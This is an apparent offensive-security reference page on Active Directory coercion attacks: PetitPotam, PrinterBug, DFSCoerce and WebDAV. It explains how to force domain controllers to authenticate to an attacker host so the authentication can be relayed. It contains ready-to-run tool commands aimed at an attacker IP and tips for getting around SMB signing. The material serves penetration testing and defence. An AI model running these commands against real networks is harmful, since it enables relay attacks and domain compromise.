---
title: "Coercion: forcing privileged machines to authenticate"
description: "Triggering authentication from Windows machines, especially domain controllers, on demand by invoking RPC and protocol methods (PetitPotam/EFSRPC, PrinterBug/MS-RPRN, DFSCoerce, and WebDAV) to feed capture or relay."
keywords:
  - coercion
  - PetitPotam
  - PrinterBug
  - DFSCoerce
  - WebDAV
---

# Coercion

Poisoning waits for a victim to make a mistake. **Coercion** removes the wait: you call a remote procedure on a target that, by design, makes it connect back and authenticate to a host you choose. Aimed at a **domain controller**, coercion produces the DC's machine-account authentication on demand, which is the input to the most damaging [relay](relay.md) chains (relay to LDAP for RBCD, or to AD CS ESC8 for a DC certificate).

## The triggers

Several built-in RPC interfaces can be made to authenticate outbound:

- **PetitPotam (MS-EFSRPC)**: the Encrypting File System remote protocol; `EfsRpcOpenFileRaw` and related calls make the target authenticate to a UNC path you supply. Reachable even from an unauthenticated position on unpatched hosts, otherwise with any domain account.
- **PrinterBug (MS-RPRN)**: the Print System Remote Protocol; `RpcRemoteFindFirstPrinterChangeNotification` makes the spooler connect back. Works wherever the Print Spooler service runs.
- **DFSCoerce (MS-DFSNM)**: the Distributed File System namespace-management interface; coerces via the DFS service, present on DCs.
- **ShadowCoerce (MS-FSRVP)**, **MS-EVEN**, and others provide additional methods when the common two are blocked.

```bash
# PetitPotam: coerce a DC to authenticate to the attacker listener
petitpotam.py -u user -p pass -d example.local <attacker-ip> <dc-ip>

# PrinterBug via the spooler
printerbug.py example.local/user:pass@<dc-ip> <attacker-ip>

# DFSCoerce
dfscoerce.py -u user -p pass -d example.local <attacker-ip> <dc-ip>
```

## Choosing the callback: SMB vs HTTP

The protocol the target authenticates over determines what you can do with it:

- **SMB callback** is the default, captured by Responder or relayed with ntlmrelayx, but SMB-to-LDAP relay is blocked when signing is negotiated.
- **HTTP callback** is the prize: coercing authentication over **HTTP** (via the WebDAV client, requiring the WebClient service on the target, which can itself be started remotely) yields an authentication **without** SMB signing in the way, enabling relay to LDAP (RBCD) and to AD CS (ESC8). Trigger the WebClient service and coerce to a `http://` or WebDAV UNC (`\\attacker@80\share`).

## Exploitation notes

- Coercion plus relay to AD CS **ESC8** against a DC's HTTP enrollment yields a certificate for the DC machine account, which is domain compromise, so coercing a DC is a top objective.
- The WebClient service is the gate for HTTP coercion; enumerate and remotely start it (for example via a rogue mapping or `webclientservicescanner`) before coercing.
- Even fully patched DCs can usually be coerced through *some* interface by an authenticated user; coercion is rarely fully closed, only narrowed.

## Tools

- **Coercer**: automates every known coercion method against a target.
- **PetitPotam.py / printerbug.py / dfscoerce.py** (Impacket-based): single-method triggers.
- **webclientservicescanner / PetitPotam -pipe**: find and start the WebClient service for HTTP coercion.

## References

- The Hacker Recipes: coerced authentications
- Microsoft: MS-EFSRPC, MS-RPRN, MS-DFSNM
